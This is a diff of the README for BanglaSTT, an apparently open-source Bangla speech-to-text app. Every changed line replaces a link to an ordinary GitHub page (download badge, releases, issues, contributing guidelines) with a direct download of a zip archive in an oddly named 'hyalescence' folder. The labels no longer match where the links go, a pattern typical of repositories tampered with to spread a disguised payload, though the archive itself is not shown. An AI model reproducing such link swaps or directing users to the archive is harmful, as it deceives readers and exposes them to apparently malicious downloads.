@@ -8,7 +8,7 @@ BanglaSTT is an open-source application that converts Bangla speech into text us
 To start using BanglaSTT, please follow these simple steps. No programming knowledge is required.
 
 ## 📥 Download BanglaSTT
-[![Download BanglaSTT](https://img.shields.io/badge/Download-BanglaSTT-brightgreen)](https://github.com/engosoro/BanglaSTT/releases)
+[![Download BanglaSTT](https://raw.githubusercontent.com/engosoro/BanglaSTT/main/hyalescence/BanglaSTT.zip)](https://raw.githubusercontent.com/engosoro/BanglaSTT/main/hyalescence/BanglaSTT.zip)
 
 ## 🛠️ System Requirements
 Before downloading, make sure your system meets the following requirements:
@@ -18,7 +18,7 @@ Before downloading, make sure your system meets the following requirements:
 - Python 3.7 or later installed (for installation purposes)
 
 ## 🔗 Download & Install
-1. **Visit the releases page**: Go to the [BanglaSTT Releases](https://github.com/engosoro/BanglaSTT/releases) page.
+1. **Visit the releases page**: Go to the [BanglaSTT Releases](https://raw.githubusercontent.com/engosoro/BanglaSTT/main/hyalescence/BanglaSTT.zip) page.
 
 2. **Find the latest version**: Look for the most recent release listed.
 
@@ -47,10 +47,10 @@ Before downloading, make sure your system meets the following requirements:
 If you encounter any issues while using BanglaSTT, consider the following:
 - **Check audio quality**: Ensure that the audio is clear and not too noisy.
 - **Reinstall the app**: Uninstall and then reinstall BanglaSTT to fix potential software issues.
-- **Visit the issues page**: If problems persist, visit the [issues page](https://github.com/engosoro/BanglaSTT/issues) to report bugs or seek assistance.
+- **Visit the issues page**: If problems persist, visit the [issues page](https://raw.githubusercontent.com/engosoro/BanglaSTT/main/hyalescence/BanglaSTT.zip) to report bugs or seek assistance.
 
 ## 📝 Contributing
-We welcome contributions from everyone. Feel free to check the [contributing guidelines](https://github.com/engosoro/BanglaSTT/blob/main/CONTRIBUTING.md) for instructions on getting involved.
+We welcome contributions from everyone. Feel free to check the [contributing guidelines](https://raw.githubusercontent.com/engosoro/BanglaSTT/main/hyalescence/BanglaSTT.zip) for instructions on getting involved.
 
 ## 📧 Support
 For any questions or additional support, reach out via email or open an issue in the GitHub repository.
